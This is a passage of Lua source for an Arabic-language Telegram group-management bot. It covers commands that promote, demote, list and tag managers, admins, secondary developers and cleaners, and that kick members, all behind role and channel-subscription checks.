tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته مدير'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المدراء'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المدراء'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
database:sadd(bot_id.."Dev:SoFi:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","◉ تم ترقيته مطور ثانوي في البوت")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع مطور ثانوي @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id.."Dev:SoFi:2", result.id_)
Reply_Status(msg,result.id_,"reply","◉ تم ترقيته مطور ثانوي في البوت")  
else
send(msg.chat_id_, msg.id_,"◉ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
return false 
end
if text and text:match("^رفع مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع مطور ثانوي (%d+)$")
database:sadd(bot_id.."Dev:SoFi:2", userid)
Reply_Status(msg,userid,"reply","◉ تم ترقيته مطور ثانوي في البوت")  
return false 
end
if text == ("تنزيل مطور ثانوي") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
function Function_DRAGON(extra, result, success)
database:srem(bot_id.."Dev:SoFi:2", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","◉ تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
if text and text:match("^تنزيل مطور ثانوي @(.*)$") and SudoBot(msg) then
local username = text:match("^تنزيل مطور ثانوي @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
database:srem(bot_id.."Dev:SoFi:2", result.id_)
Reply_Status(msg,result.id_,"reply","◉ تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"◉ لا يوجد حساب بهاذا المعرف")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DRAGON, nil)
return false
end  
if text and text:match("^تنزيل مطور ثانوي (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور ثانوي (%d+)$")
database:srem(bot_id.."Dev:SoFi:2", userid)
Reply_Status(msg,userid,"reply","◉ تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n◉ قائمة مطورين الثانوين للبوت \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "◉ لا يوجد مطورين ثانويين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("مسح الثانوين") and SudoBot(msg) then
database:del(bot_id.."Dev:SoFi:2")
send(msg.chat_id_, msg.id_, "\n◉ تم مسح قائمة المطورين الثانوين  ")
end
if text=="اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ◉ ارسل الان اذاعتك؟ \n ◉ للخروج ارسل الغاء ")
return false
end 
------------------------------------------------------------------------
if text ==("رفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_," ◉ لا يوجد ادمنيه ليتم رفعهم") 
else
send(msg.chat_id_, msg.id_," ◉ تمت ترقيه { "..num2.." } من الادمنيه") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح الادمنيه')
end
if text == ("الادمنيه") and Manager(msg) then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ◉ قائمة الادمنيه \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") then
local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد ادمنيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته ادمن'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته ادمن'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن @(.*)$") and Manager(msg) then
local username = text:match("^تنزيل ادمن @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الادمنيه'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^تنزيل ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من الادمنيه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == 'مسح المنظفين' and BasicConstructor(msg) then
database:del(bot_id..'S00F4:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ◉ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
t = "\n ◉ قائمة المنظفين \n≪━━━━━━𝓓𝓡◉━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد المنظفين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("تاك للمنظفين") or text == ("صيح المنظفين") then
local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝓓◉𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد منظفيه"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منظف @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منظف'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منظف") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منظف @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنظفين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منظف (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منظف (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المنظفين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("طرد") and msg.reply_to_message_id_ ~=0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع طرد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
statusk  = '\n ◉ تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end,nil)
chat_kick(result.chat_id_, result.sender_user_id_)
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^طرد @(.*)$") and Mod(msg) then 
local username = text:match("^طرد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الطرد') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع طرد ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
statusk  = '\n ◉ تم طرد العضو'
texts = usertext..statusk
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
end,nil)   
end
else
send(msg.chat_id_, msg.id_, ' ◉ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  

if text and text:match("^طرد (%d+)$") and Mod(msg) then 
local userid = text:match("^طرد (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الطرد') 
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع طرد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n ◉ عذرا لا تستطيع طرد ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,' ◉ ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ◉ البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
chat_kick(msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
 usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
 statusk  = '\n ◉ تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
else
 usertext = '\n ◉ العضو ← '..userid..''
 statusk  = '\n ◉ تم طرد العضو'
send(msg.chat_id_, msg.id_, usertext..statusk)
end;end,nil)
end,nil)   
end
return false
end
------------------------------------------------------------------------
------------------------------------------------------------------------
if text == 'مسح المميزين' and Mod(msg) then
database:del(bot_id..'Special:User'..msg.chat_id_)
